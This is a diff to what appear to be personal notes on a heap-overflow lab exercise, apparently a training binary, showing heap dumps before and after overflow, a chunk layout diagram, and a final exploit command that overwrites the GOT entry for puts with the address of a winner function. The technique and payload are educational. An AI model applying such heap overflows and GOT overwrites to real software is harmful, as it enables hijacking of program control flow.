@@ -86,3 +86,27 @@ HEAP1 NOTES:
  804856d:      90                       nop
  804856e:      90                       nop
  804856f:      90                       nop
+
+*****HEAP AFTER RUN AAAA BBBB*****
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x00000000      0x00000000      0x00000011
+0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
+0x804a038:      0x42424242      0x00000000      0x00000000      0x00020fc1
+
+*****HEAP AFTER OVERFLOW*****
+0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+0x804a018:      0x41414141      0x41414141      0x41414141      0x41414111
+0x804a028:      0x00000002      0x08048494      0x00000000      0x00000011
+0x804a038:      0x42424242      0x00000000      0x00000000      0x00020fc1
+
+*****HOW THE HEAP IS LAID OUT*****
+With a Malloc(8) for each call:
+0x804a008: [First Malloc]  [NxtChnkAddr]   [Maintain Space] [Chunk Size (8 or 0x10, the 0x11 is for free)]
+0x804a018: [Second Malloc] [Second Malloc] [Maintain Space] [Chunk Size] <---Where the strcpy happens for arg1
+0x804a028: [Third Malloc]  [NxtChnkAddr]   [Maintain Space] [Chunk Size]
+0x804a038: [Fourth Malloc] [Fourth Malloc] [Maintain Space] [Chunk Size] <---Where the strcpy happens for arg2
+
+Using the first arg we can choose a specific location to overwrite to. Using the second argument we can choose what to overwrite. Going to overwrite the GOT entry for <puts>, since it gets called at the end, with the address of <winner>.
+
+Exploit:
+run `echo -ne "AAAABBBBCCCCDDDDEEEE\x74\x97\x04\x08"` `echo -ne "\x94\x84\x04\x08"`
